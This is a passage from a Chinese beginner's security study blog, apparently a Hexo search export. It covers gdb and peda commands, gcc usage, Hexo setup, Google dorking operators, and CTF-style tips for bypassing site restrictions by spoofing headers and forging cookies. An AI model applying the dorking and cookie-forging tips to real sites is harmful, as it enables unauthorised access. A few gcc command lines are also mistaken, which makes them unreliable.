<p>(gdb) set $v0 = 0x004000000<br>(gdb) set $epc = 0xbfc00000</p>
</blockquote>
<h3 id="4、修改内存的值"><a href="#4、修改内存的值" class="headerlink" title="4、修改内存的值"></a>4、修改内存的值</h3><blockquote>
<p>(gdb) set {unsigned int}0x8048a51=0x0<br>(gdb) set <em>(unsigned int</em>)0x8048a54=0x55aa55aa</p>
</blockquote>
<h3 id="5、内存搜索"><a href="#5、内存搜索" class="headerlink" title="5、内存搜索"></a>5、内存搜索</h3><blockquote>
<p>Usage: find </p>
<p>(gdb) define find<br>set $ptr = $arg0<br>set $cnt = 0<br>while ( ($ptr&lt;=$arg1) &amp;&amp; ($cnt&lt;$arg2) )<br>   if ( <em>(unsigned int </em>)$ptr == $arg3 )<br>       x /wx $ptr<br>       set $cnt = $cnt + 1<br>   end<br>   set $ptr = $ptr + 4<br>end<br>end</p>
</blockquote>
<h3 id="6、断点、监测点"><a href="#6、断点、监测点" class="headerlink" title="6、断点、监测点"></a>6、断点、监测点</h3><blockquote>
<p>(gdb) b <em>0x80400000<br>(gdb) watch </em>(unsigned int *)0xbffff400==0x90909090</p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 寄存器 debug </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[gdb与peda指令学习学习笔记]]></title>
      <url>/2016/10/30/gdb%E4%B8%8Epeda%E6%8C%87%E4%BB%A4%E5%AD%A6%E4%B9%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p>下午学习的gdb指令。傻傻的对一个自己的程序输入打开指令打不开。问问才知道要先转换成可执行文件，上网有学学gcc指令收获不少啊。。<br><a id="more"></a></p>
<h2 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a><strong>遇到问题</strong></h2><h3 id="1、写了一个C-语言但是用指令转换成可执行文件时候呢显示iostream不存在"><a href="#1、写了一个C-语言但是用指令转换成可执行文件时候呢显示iostream不存在" class="headerlink" title="1、写了一个C++语言但是用指令转换成可执行文件时候呢显示iostream不存在"></a>1、写了一个C++语言但是用指令转换成可执行文件时候呢显示iostream不存在</h3><p>解决：对于C语言使用的转换指令是（假设文件是doc.c）<br>将C语言的文件doc.c转换为了doc</p>
<blockquote>
<p>gcc doc.c -o doc</p>
</blockquote>
<p>还有一个默认转换，也就是后面可以不加你转换的名字，系统默认转换后的名字为a.out</p>
<blockquote>
<p>gcc doc.c</p>
</blockquote>
<p>对于C++语言使用的转换指令是</p>
<blockquote>
<p>g++ doc.c -o doc</p>
</blockquote>
<h3 id="2、显示j-strlen-s-语句出错。"><a href="#2、显示j-strlen-s-语句出错。" class="headerlink" title="2、显示j=strlen(s)语句出错。"></a>2、显示j=strlen(s)语句出错。</h3><p>解决：原来linux的习惯，strlen声明放在 string.h 中(linux系统中可以通过man strlen来查看其帮助和所在头文件)，仅仅 #include <string> 只是引入了 std::string，还需要 #include <string.h></string.h></string></p>
<p>###3、其他指令<br>(1)、 将test.c预处理输出test.i文件。</p>
<blockquote>
<p>gcc -E test.c -o test.i</p>
</blockquote>
<p>(2)、 将预处理输出文件test.i汇编成test.s文件。</p>
<blockquote>
<p>gcc -E test.c -o test.i</p>
</blockquote>
<p>(3)、 将汇编输出文件test.s编译输出test.o文件。</p>
<blockquote>
<p>gcc -c test.s</p>
</blockquote>
<p>(4)、 将编译输出文件test.o链接成最终可执行文件test。</p>
<blockquote>
<p>gcc test.o -o test</p>
</blockquote>
<p>(5)、 使用编译优化级别1编译程序。级别为1~3，级别越大优化效果越好，但编译时间越长。</p>
<blockquote>
<p>gcc -O1 test.c -o test</p>
</blockquote>
<h3 id="4、多源文件的编译方法"><a href="#4、多源文件的编译方法" class="headerlink" title="4、多源文件的编译方法"></a>4、多源文件的编译方法</h3><p>(1)、多个文件一起编译<br>将testfun.c和test.c分别编译后链接成test可执行文件。</p>
<blockquote>
<p>gcc testfun.c test.c -o test</p>
</blockquote>
<p>(2)、分别编译各个源文件，之后对编译后输出的目标文件链接。<br>将testfun.c编译成testfun.o<br>将test.c编译成test.o<br>将testfun.o和test.o链接成test</p>
<blockquote>
<p>gcc -c testfun.c<br>gcc -c test.c<br>gcc -o testfun.o test.o -o test</p>
</blockquote>
<p>在搜索的过程中也发现了一个好玩的命令就先记录下吧，这是个gdb下的指令。</p>
<p>如果想看看现在的默认反汇编格式是什么，可以使用如下命令</p>
<blockquote>
<p>(gdb) show disassembly-flavor</p>
</blockquote>
<p>如果看不懂，那就转换汇编格式</p>
<blockquote>
<p>(gdb) set disassembly-flavor intel</p>
</blockquote>
<p>经过以上的步骤就可以把想要的可执行文件得到，下面就是对程序进行指令分析。程序为(doc)</p>
<p>运行程序看看</p>
<blockquote>
<p>./doc</p>
</blockquote>
<p>进入gdb指令下。（gdb + doc）<br>反编译</p>
<blockquote>
<p>disassemble main</p>
</blockquote>
<p>下面是基础的调试指令</p>
<table>
<thead>
<tr>
<th style="text-align:center">名称</th>
<th style="text-align:center">介绍</th>
<th style="text-align:center">用法</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">r</td>
<td style="text-align:center">r 是run的简写，也就是在GDB下运行程序。（如果有设置断点会运行到断点）</td>
<td style="text-align:center">（gdb）r</td>
</tr>
<tr>
<td style="text-align:center">c</td>
<td style="text-align:center">C是continue的简写，就是继执行被调试的程序，直到下一次断点处或者结束</td>
<td style="text-align:center">（gdb）c</td>
</tr>
<tr>
<td style="text-align:center">b &lt;行号&gt;/&lt;函数名称&gt;/<em>&lt;函数名称&gt;/</em>&lt;代码地址&gt;</td>
<td style="text-align:center">b 是breakpoint的简写，就是设置断点，可以使用行号，函数名，执行地址进行下断。而函数名前加一个*则表示将断点设置在“由编译器生成的prolog代码处”，者在了解汇编后可以理解。</td>
<td style="text-align:center">（gdb）b 8、（gdb）b main 、(gdb)b <em>main 、（gdb）b </em>0x8048534</td>
</tr>
<tr>
<td style="text-align:center">d [编号]</td>
<td style="text-align:center">d 是delete breakpoint的简写，就是删除制定编号后的断点，也可以一次删去所有断点。</td>
<td style="text-align:center">（gdb）d 2</td>
</tr>
<tr>
<td style="text-align:center">p &lt;变量名称&gt;</td>
<td style="text-align:center">P是print的简写，显示指定变量的值（临时变量或全局变量）。</td>
<td style="text-align:center">（print）p n</td>
</tr>
<tr>
<td style="text-align:center">q</td>
<td style="text-align:center">不需要多解释了，就是退出调试</td>
<td style="text-align:center">（gdb）q</td>
</tr>
<tr>
<td style="text-align:center">S</td>
<td style="text-align:center">执行一行源代码，如果此行代码有函数调用，进入该函数，也就相当于其他调试器的单步步入。</td>
<td style="text-align:center">（gdb）s</td>
</tr>
<tr>
<td style="text-align:center">n</td>
<td style="text-align:center">执行一段源代码，代码中的函数调用也一并执行，也就相当于其他调试器的单步步过。</td>
<td style="text-align:center">（gdb）n</td>
</tr>
<tr>
<td style="text-align:center">Si ,ni</td>
<td style="text-align:center">这两个对应着的是s和n。不同的是这两个是对汇编语言的，而前两个是对源代码的。</td>
<td style="text-align:center">（gdb）si、（gdb）ni</td>
</tr>
</tbody>
</table>
<p>然后是peda的一些指令</p>
<blockquote>
<p>checksec –检查二进制的各种安全选项<br>dumpargs –当在调用指令时停止显示参数传递给函数<br>elfheader–调试文件的标题指令<br>elfsymbol–从一个精灵文件获得非调试符号信息<br>lookup   –搜索所有的地址/参考地址属于一个内存范围<br>readelf –从一个逆向文件获取标题信息<br>patch –内存补丁开始在字符串/ hexstring /诠释一个地址（？）<br>pattern –生成、搜索或写一个循环模式到内存<br>pshow –显示各种PEDA选项和其他设置<br>pset –设置各种peda选项和其他设置<br>procinfo –显示从/ proc / PID的各种信息<br>shellcode –生成或下载常见shellcodes<br>xormem –一个密钥异或内存区<br>vmmap –在调试过程中获得部分（S）的虚拟映射地址范围<br>ropgadget–得到的二进制或静态库共同ROP小工具<br>ropsearch –记忆中搜索rop小工具使用<br>skeleton –Python开发代码生成模板<br>dumprop –丢弃在特定的内存范围内所有ROP小工具<br>searchmem|find –在记忆中搜索模式；支持正则表达式搜索</p>
</blockquote>
<p>指令中提到了一个ROP，也不知道是啥，去搜一搜，原来：<br>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）</p>
<p>这个溢出攻击可参照网址：<a href="http://www.programlife.net/linux-rop-stack-overflow.html" target="_blank" rel="external">http://www.programlife.net/linux-rop-stack-overflow.html</a></p>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> debug </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[hexo搭建]]></title>
      <url>/2016/09/04/hexo%E6%90%AD%E5%BB%BA/</url>
      <content type="html"><![CDATA[<h1 id="Hexo搭建Github静态博客"><a href="#Hexo搭建Github静态博客" class="headerlink" title="Hexo搭建Github静态博客"></a>Hexo搭建Github静态博客</h1><a id="more"></a>
<p>应用GitHub Pages创建属于自己的个人博客，GitHub将提供免费的空间。GitHub提供的域名（用户名+github+io）,在Repository name对应处填写资源名，其需要使用自己的用户名，每个用户名下面只能建立一个，并且资源命名必须符合这样的规则username/username.github.io，之后勾选下面的”Initialize this repository with a README”</p>
<h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><h3 id="1-1安装Git"><a href="#1-1安装Git" class="headerlink" title="1.1安装Git"></a>1.1安装Git</h3><p>下载地址：<a href="https://git-scm.com/download/win" target="_blank" rel="external">https://git-scm.com/download/win</a><br>下载安装包后正常安装即可。</p>
<h3 id="1-2安装node-js"><a href="#1-2安装node-js" class="headerlink" title="1.2安装node.js"></a>1.2安装node.js</h3><p>下载地址：<a href="http://nodejs.org/download/" target="_blank" rel="external">http://nodejs.org/download/</a><br>可以下载 node-v0.10.33-x64.msi<br>安装时直接保持默认配置即可。</p>
<h2 id="2-配置Github"><a href="#2-配置Github" class="headerlink" title="2.配置Github"></a>2.配置Github</h2><h3 id="1-1建立Repository"><a href="#1-1建立Repository" class="headerlink" title="1.1建立Repository"></a>1.1建立Repository</h3><p>建立与你用户名对应的仓库，仓库名必须为【your_user_name.github.io】</p>
<h3 id="1-2配置SSH-Key"><a href="#1-2配置SSH-Key" class="headerlink" title="1.2配置SSH-Key"></a>1.2配置SSH-Key</h3><p>参考：<a href="http://beiyuu.com/github-pages" target="_blank" rel="external">http://beiyuu.com/github-pages</a></p>
<h2 id="3-安装Hexo"><a href="#3-安装Hexo" class="headerlink" title="3.安装Hexo"></a>3.安装Hexo</h2><p>关于Hexo的安装配置过程，请以官方Hexo给出的步骤为准。</p>
<h3 id="3-1Installation"><a href="#3-1Installation" class="headerlink" title="3.1Installation"></a>3.1Installation</h3><p>打开Git命令行，执行如下命令</p>
<blockquote>
<p>$ npm install -g hexo</p>
</blockquote>
<h3 id="3-2-Quick-Start"><a href="#3-2-Quick-Start" class="headerlink" title="3.2 Quick Start"></a>3.2 Quick Start</h3><p><strong>1.Setup your blog</strong><br>在电脑中建立一个名字叫「Hexo」的文件夹（比如我建在了D:\Hexo），然后在此文件夹中右键打开Git Bash。执行下面的命令</p>
<blockquote>
<p>$ hexo init<br>[info] Copying data<br>[info] You are almost done! Don’t forget to run <code>npm install</code> before you start b<br>logging with Hexo!</p>
</blockquote>
<p>Hexo随后会自动在目标文件夹建立网站所需要的文件。然后按照提示，运行 npm install（在 /D/Hexo下）</p>
<blockquote>
<p>npm install</p>
</blockquote>
<p>会在D:\Hexo目录中安装 node_modules。</p>
<p><strong>2.Start the server</strong><br>运行下面的命令（在 /D/Hexo下）</p>
<blockquote>
<p>$ hexo server<br>[info] Hexo is running at <a href="http://localhost:4000/" target="_blank" rel="external">http://localhost:4000/</a>. Press Ctrl+C to stop.</p>
</blockquote>
<p><strong>3. Create a new post</strong><br>新打开一个git bash命令行窗口，cd到/D/Hexo下，执行下面的命令</p>
<blockquote>
<p>$ hexo new “My New Post”<br>[info] File created at d:\Hexo\source_posts\My-New-Post.md</p>
</blockquote>
<p>刷新<a href="http://localhost:4000/，可以发现已生成了一篇新文章" target="_blank" rel="external">http://localhost:4000/，可以发现已生成了一篇新文章</a> “My New Post”。</p>
<p><strong>NOTE:</strong><br>有一个问题，发现 “My New Post” 被发了2遍，在Hexo server所在的git bash窗口也能看到create了2次。</p>
<blockquote>
<p>$ herxo serve<br>[info] Hexo is running at <a href="http://localhost:4000/" target="_blank" rel="external">http://localhost:4000/</a>. Press Ctrl+C to stop.[create] d:\Hexo\source_posts\My-New-Post.md<br>[create] d:\Hexo\source_posts\My-New-Post.md</p>
</blockquote>
<p>经验证，在hexo new “My New Post” 时，如果按Ctrl+C将hexo server停掉，就不会出现发2次的问题了。</p>
<p>所以，在hexo new文章时，需要stop server。</p>
<p><strong>4. Generate static files</strong><br>执行下面的命令，将markdown文件生成静态网页</p>
<blockquote>
<p>$ hexo generate</p>
</blockquote>
<p>该命令执行完后，会在 D:\Hexo\public\ 目录下生成一系列html，css等文件。</p>
<p><strong>5. 编辑文章</strong></p>
<p>hexo new “My New Post”会在D:\Hexo\source_posts目录下生成一个markdown文件：My-New-Post.md<br>可以使用一个支持markdown语法的编辑器（比如 Sublime Text 2）来编辑该文件。</p>
<p><strong>6. 部署到Github</strong></p>
<p>部署到Github前需要配置_config.yml文件，首先找到下面的内容</p>
<blockquote>
<p>#Deployment</p>
<p>##Docs: <a href="http://hexo.io/docs/deployment.htmldeploy" target="_blank" rel="external">http://hexo.io/docs/deployment.htmldeploy</a>: type:</p>
</blockquote>
<p>然后将它们修改为</p>
<blockquote>
<p>#Deployment</p>
<p>##Docs: <a href="http://hexo.io/docs/deployment.htmldeploy" target="_blank" rel="external">http://hexo.io/docs/deployment.htmldeploy</a>: type: github<br>  repository: git@github.com:zhchnchn/zhchnchn.github.io.git branch: master</p>
</blockquote>
<p><strong>NOTE1:</strong><br>Repository：必须是SSH形式的url（git@github.com:zhchnchn/zhchnchn.github.io.git），而不能是HTTPS形式的url（<a href="https://github.com/zhchnchn/zhchnchn.github.io.git），否则会出现错误：" target="_blank" rel="external">https://github.com/zhchnchn/zhchnchn.github.io.git），否则会出现错误：</a></p>
<blockquote>
<p>$ hexo deploy<br>[info] Start deploying: github<br>[error] <a href="https://github.com/zhchnchn/zhchnchn.github.io" target="_blank" rel="external">https://github.com/zhchnchn/zhchnchn.github.io</a> is not a valid repositor URL!</p>
</blockquote>
<p>使用SSH url，如果电脑没有开放SSH 端口，会致部署失败。</p>
<blockquote>
<p>fatal: Could not read from remote repository.</p>
<p>Please make sure you have the correct access rights and the repository exists.</p>
</blockquote>
<p><strong>NOTE2：</strong><br>如果你是为一个项目制作网站，那么需要把branch设置为gh-pages。<br><strong>7. 测试</strong><br>当部署完成后，在浏览器中打开<a href="http://zhchnchn.github.io/（https://zhchnchn.github.io/）" target="_blank" rel="external">http://zhchnchn.github.io/（https://zhchnchn.github.io/）</a> ，正常显示网页，表明部署成功。<br><strong>8. 总结：部署步骤</strong><br>每次部署的步骤，可按以下三步来进行。</p>
<blockquote>
<p>hexo clean<br>hexo generate<br>hexo deploy</p>
</blockquote>
<p><strong>9. 总结：本地调试</strong></p>
<ol>
<li>在执行下面的命令后，</li>
</ol>
<blockquote>
<p>$ hexo g #生成<br>$ hexo s #启动本地服务，进行文章预览调试</p>
</blockquote>
<p>浏览器输入<a href="http://localhost:4000，查看搭建效果。此后的每次变更_config.yml" target="_blank" rel="external">http://localhost:4000，查看搭建效果。此后的每次变更_config.yml</a> 文件或者新建文件都可以先用此命令调试，尤其是当你想调试新添加的主题时。</p>
<p><strong>2. 可以用简化的一条命令</strong></p>
<blockquote>
<p>hexo s -g</p>
</blockquote>
<h2 id="命令总结"><a href="#命令总结" class="headerlink" title="命令总结"></a>命令总结</h2><h3 id="3-3-1常用命令"><a href="#3-3-1常用命令" class="headerlink" title="3.3.1常用命令"></a>3.3.1常用命令</h3><blockquote>
<p>hexo new “postName” #新建文章<br>hexo new page “pageName” #新建页面<br>hexo generate #生成静态页面至public目录<br>hexo server #开启预览访问端口（默认端口4000，’ctrl + c’关闭server）<br>hexo deploy #将.deploy目录部署到GitHub<br>hexo help # 查看帮助<br>hexo version #查看Hexo的版本</p>
</blockquote>
<h3 id="3-3-2"><a href="#3-3-2" class="headerlink" title="3.3.2"></a>3.3.2</h3><blockquote>
<p>hexo deploy -g  #生成加部署<br>hexo server -g  #生成加预览</p>
</blockquote>
<p>命令的简写为：</p>
<blockquote>
<p>hexo n == hexo new<br>hexo g == hexo generate<br>hexo s == hexo server<br>hexo d == hexo deploy</p>
</blockquote>
<h2 id="4-配置Hexo"><a href="#4-配置Hexo" class="headerlink" title="4 配置Hexo"></a>4 配置Hexo</h2><h3 id="4-1-配置文件介绍"><a href="#4-1-配置文件介绍" class="headerlink" title="4.1 配置文件介绍"></a>4.1 配置文件介绍</h3><p>下面的各个部分的介绍，请直接参考【3】。</p>
<p><strong>1._config.yml配置文件介绍</strong><br>NOTE：在修改_config.yml配置文件时，按照【3】的介绍进行修改后，重新 hexo clean 或者hexo deploy时，可能会出现如下错误：</p>
<blockquote>
<p>$ hexo clean<br>[error] { name: ‘HexoError’,<br> reason: ‘can not read a block mapping entry; a multiline key<br> may not be an imp<br> licit key’, mark:<br>    { name: null,<br>       buffer: ‘# Hexo Configuration\n## Docs:<br> <a href="http://hexo.io/docs/configuration.h" target="_blank" rel="external">http://hexo.io/docs/configuration.h</a><br> tml\n## Source: <a href="https://github.com/hexojs/hexo/\n\n#" target="_blank" rel="external">https://github.com/hexojs/hexo/\n\n#</a> Site\ntitle: Zhchnchn\nsubt<br> itle: Coding on the way\ndescription: Zhchnchn\’s blog\nauthor:<br> Zhchnchn\nemail:115063497@qq.com\nlanguage:zh-CN\n\n# URL\n## If your        site is put in a subdirect ……<br> ,<br> position: 249,<br> line: 12,<br> column: 0 },<br> message: ‘Config file load failed’,<br> domain:<br> { domain: null,<br>  _events: { error: [Function] },<br>  _maxListeners: 10,<br>  members: [ [Object] ] },<br>  domainThrown: true,<br>  stack: undefined }</p>
</blockquote>
<p>我的_config.yml配置文件是一个空行，所以错误肯定在前面，经过对比发现，我前面修改了一下 # Site的各项设置，在冒号:后面没留空格导致了该问题，请对比一下下面的区别：</p>
<p>错误的设置：</p>
<blockquote>
<p>author:Zhchnchn<br>email:XXX@qq.com<br>language:zh-CN</p>
</blockquote>
<p>正确的设置：</p>
<blockquote>
<p>author: Zhchnchn<br>email: XXX@qq.com<br>language: zh-CN</p>
</blockquote>
<p>(问题在于必须要有空格)</p>
<h2 id="4-2-安装主题"><a href="#4-2-安装主题" class="headerlink" title="4.2 安装主题"></a>4.2 安装主题</h2><p>Hexo提供了很多主题，具体可参见Hexo Themes【4】。这里我选择使用Pacman主题。具体设置方法如下【5】</p>
<h3 id="4-2-1安装"><a href="#4-2-1安装" class="headerlink" title="4.2.1安装"></a>4.2.1安装</h3><ol>
<li>将Git Shell 切到/D/Hexo目录下，然后执行下面的命令，将pacman下载到 themes/pacman 目录下。</li>
</ol>
<blockquote>
<p>$ git clone <a href="https://github.com/A-limon/pacman.git" target="_blank" rel="external">https://github.com/A-limon/pacman.git</a> themes/pacman</p>
</blockquote>
<ol>
<li><p>修改你的博客根目录/D/Hexo下的config.yml配置文件中的theme属性，将其设置为pacman。</p>
</li>
<li><p>更新pacman主题</p>
</li>
</ol>
<blockquote>
<p>cd themes/pacman<br>git pull</p>
</blockquote>
<p><strong>NOTE：</strong>先备份_config.yml 文件后再升级</p>
<h3 id="4-4-2配置"><a href="#4-4-2配置" class="headerlink" title="4.4.2配置"></a>4.4.2配置</h3><p>如果pacman的默认设置不能满足需要的话，你可以修改 /themes/pacman/下的配置文件_config.yml来定制。</p>
<p>详细主题跟新安装参照【<a href="http://blog.csdn.net/qq_23435721/article/details/50938038" target="_blank" rel="external">http://blog.csdn.net/qq_23435721/article/details/50938038</a>】</p>
<h2 id="5-发布文章"><a href="#5-发布文章" class="headerlink" title="5.发布文章"></a>5.发布文章</h2><blockquote>
<p>$ hexo new “My New Post”<br>[info] File created at d:\Hexo\source_posts\My-New-Post.md<br>hexo g #生成静态文件<br>hexo g -d #部署到Github</p>
</blockquote>
]]></content>
      
        
        <tags>
            
            <tag> blog </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Google hacking 语法]]></title>
      <url>/2016/09/03/Google-hacking-%E8%AF%AD%E6%B3%95/</url>
      <content type="html"><![CDATA[<h2 id="1-单词语法"><a href="#1-单词语法" class="headerlink" title="1.单词语法"></a>1.单词语法</h2><a id="more"></a>
<h3 id="intext"><a href="#intext" class="headerlink" title="intext:"></a>intext:</h3><p>这个就是把网页中的正文内容中的某个字符做为搜索条件，例如在google里输入：intext：动网，将返回所有在网页正文部分包含”动网”的网页。</p>
<h3 id="allintext"><a href="#allintext" class="headerlink" title="allintext:"></a>allintext:</h3><p>使用方法和intext类似.</p>
<h3 id="intitle"><a href="#intitle" class="headerlink" title="intitle:"></a>intitle:</h3><p>和上面那个intext差不多，搜索网页标题中是否有我们所要找的字符，例如搜索：intitle：安全天使，将返回所有网页标题中包含“安全天使”的网页。同理allintitle也同intitle类似。</p>
<h3 id="cache"><a href="#cache" class="headerlink" title="cache:"></a>cache:</h3><p>搜索google里关于某些内容的缓存，有时候也许能找到一些好东西哦。</p>
<h3 id="define"><a href="#define" class="headerlink" title="define:"></a>define:</h3><p>搜索某个词语的定义。搜索：define：hacker，将返回关于hacker的定义。</p>
<h3 id="filetype"><a href="#filetype" class="headerlink" title="filetype:"></a>filetype:</h3><p>这个我要重点推荐一下，无论是撒网式攻击还是我们后面要说的搜索指定类型的文件。例如输入：filetype：doc，将返回所有以doc结尾的文件URL。当然如果你找.bak、.mdb或.inc也是可以的，获得的信息也许会更丰富。</p>
<h3 id="info"><a href="#info" class="headerlink" title="info:"></a>info:</h3><p>查找指定站点的一些基本信息。</p>
<h3 id="inurl"><a href="#inurl" class="headerlink" title="inurl:"></a>inurl:</h3><p>搜索我们指定的字符是否存在于URL中。例如输入：inurl：admin，将返回N个类似于这样的连接：<a href="http://www.xxx.com/xxx/admin。用来找管理员登陆的URL不错。allinurl也同inurl类似，可指定多个字符。" target="_blank" rel="external">http://www.xxx.com/xxx/admin。用来找管理员登陆的URL不错。allinurl也同inurl类似，可指定多个字符。</a></p>
<h2 id="符号语法"><a href="#符号语法" class="headerlink" title="符号语法"></a><strong>符号语法</strong></h2><h3 id=""><a href="#" class="headerlink" title="+"></a>+</h3><p> 把google可能忽略的字列如查询范围</p>
<h3 id="-1"><a href="#-1" class="headerlink" title="-"></a>-</h3><p>把某个字忽略</p>
<h3 id="-2"><a href="#-2" class="headerlink" title="~"></a>~</h3><p>同意词</p>
<h3 id="-3"><a href="#-3" class="headerlink" title="."></a>.</h3><p>单一的通配符</p>
<h3 id="-4"><a href="#-4" class="headerlink" title="*"></a>*</h3><p>通配符，可代表多个字母</p>
<h3 id="“”"><a href="#“”" class="headerlink" title="“”"></a>“”</h3><p>精确查询</p>
]]></content>
      
        <categories>
            
            <category> others </category>
            
        </categories>
        
        
        <tags>
            
            <tag> search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[绕过网站访问限制的方法]]></title>
      <url>/2016/09/03/%E7%BB%95%E8%BF%87%E7%BD%91%E7%AB%99%E8%AE%BF%E9%97%AE%E9%99%90%E5%88%B6%E7%9A%84%E6%96%B9%E6%B3%95/</url>
      <content type="html"><![CDATA[<h2 id="1-只允许国外访问"><a href="#1-只允许国外访问" class="headerlink" title="1.只允许国外访问:"></a>1.只允许国外访问:</h2><a id="more"></a>
<p>将 HTTP 请求头中的 Accept-Language 为中文(cn-zh)，修改为英文(en-us)。</p>
<h2 id="2-浏览器限制访问"><a href="#2-浏览器限制访问" class="headerlink" title="2.浏览器限制访问:"></a>2.浏览器限制访问:</h2><p>修改 HTTP 请求中的 User-Agent 信息。里面标注的有访问所用的浏览器和系统版本。也可以使用火狐的default user agent插件进行修改。</p>
<h2 id="3-IP地址限制访问："><a href="#3-IP地址限制访问：" class="headerlink" title="3.IP地址限制访问："></a>3.IP地址限制访问：</h2><p>跟 HTTP 请求头中的 X-Forwarded-For、client-ip、remote_addr 有关系，也可以使用代理进行访问。</p>
<h2 id="4-用户登陆限制访问："><a href="#4-用户登陆限制访问：" class="headerlink" title="4.用户登陆限制访问："></a>4.用户登陆限制访问：</h2><p>可能是 Cookie 的问题，如果 Cookie 比较简单，可以尝试构造cookie。</p>
<h2 id="5-隐藏信息："><a href="#5-隐藏信息：" class="headerlink" title="5.隐藏信息："></a>5.隐藏信息：</h2><p>查看 robots.txt 可以获得该网站的一些信息。</p>
<h2 id="6-其他："><a href="#6-其他：" class="headerlink" title="6.其他："></a>6.其他：</h2><p>有一些加referer加上代理ip</p>
<p>PS：原文:(<a href="http://byd.dropsec.xyz" target="_blank" rel="external">http://byd.dropsec.xyz</a>)</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
